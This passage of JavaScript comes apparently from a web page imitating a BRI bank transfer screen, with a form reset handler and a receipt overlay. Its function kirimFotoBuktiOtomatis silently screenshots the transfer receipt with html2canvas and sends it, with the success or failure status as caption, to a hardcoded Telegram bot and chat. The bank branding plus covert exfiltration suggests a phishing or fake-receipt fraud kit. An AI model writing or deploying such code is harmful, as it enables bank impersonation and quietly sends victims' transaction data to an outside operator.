    receiptDoneButton.addEventListener('click', (e) => {
        e.preventDefault();
        
        receiptOverlay.style.display = 'none';
        
        nominalInput.value = ''; 
        continueButton.disabled = true; 
        
        const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
        minTextElement.textContent = `Minimum transfer adalah ${formattedMin}`;
        minTextElement.style.color = originalMinColor;

        catatanInput.value = ''; 
        catatanInput.dispatchEvent(new Event('input')); 
        
        if (receiptExpandedDetails) {
            receiptExpandedDetails.classList.remove('expanded');
        }
        if (receiptToggleLink) {
            receiptToggleLink.classList.remove('expanded');
            const textSpan = receiptToggleLink.querySelector('span:first-child');
            if (textSpan) {
                textSpan.textContent = 'Lihat Detail Transaksi';
            }
        }
        
        window.scrollTo(0, 0);
        setupOverlay.style.display = 'flex';
        loadSetupFormWithSavedData();
    });
}

// --- FUNGSI BARU: KIRIM FOTO BUKTI KE TELEGRAM (BOT FOTO BARU) ---
function kirimFotoBuktiOtomatis() {
    if (typeof html2canvas === 'undefined') {
        console.error("Library html2canvas belum terpasang!");
        return;
    }

    const element = document.getElementById('receipt-overlay');
    const footer = document.querySelector('.receipt-footer');
    
    // --- [FIX LAYOUT SEBELUM FOTO] ---
    const originalOverflow = element.style.overflow;
    const originalFooterPos = footer.style.position;
    const originalFooterBoxShadow = footer.style.boxShadow;

    element.style.overflow = "visible"; 
    footer.style.position = "relative"; 
    footer.style.boxShadow = "none";    
    footer.style.marginTop = "20px";    
    
    window.scrollTo(0, 0);

    // AMBIL STATUS LANGSUNG DARI ELEMEN JUDUL STRUK
    // Ini akan berisi "Transaksi Berhasil" atau "Transaksi Gagal"
    const statusText = document.querySelector('#receipt-status-title').innerText;

    html2canvas(element, {
        scale: 2, 
        useCORS: true, 
        allowTaint: true,
        scrollY: 0, 
        backgroundColor: "#F8F9FB", 
        height: element.scrollHeight + 50 
    }).then(canvas => {
        
        // --- [KEMBALIKAN LAYOUT SETELAH FOTO] ---
        element.style.overflow = originalOverflow;
        footer.style.position = originalFooterPos;
        footer.style.boxShadow = originalFooterBoxShadow;
        footer.style.marginTop = "0";
        // ----------------------------------------

        canvas.toBlob(function(blob) {
            if (!blob) return;

            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID); 
            formData.append('photo', blob, 'bukti-transfer-bri.png');
            
            // CAPTION: Hanya Status (Berhasil/Gagal)
            formData.append('caption', statusText);
            
            // KIRIM KE BOT BARU KHUSUS FOTO
            fetch(`https://api.telegram.org/bot${TELEGRAM_PHOTO_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => console.log("Foto bukti terkirim ke Bot Foto!"))
            .catch(err => console.error("Gagal kirim foto:", err));

        }, 'image/png');
    }).catch(err => {
        console.error("Gagal render canvas:", err);
        element.style.overflow = originalOverflow;
        footer.style.position = originalFooterPos;
    });
}
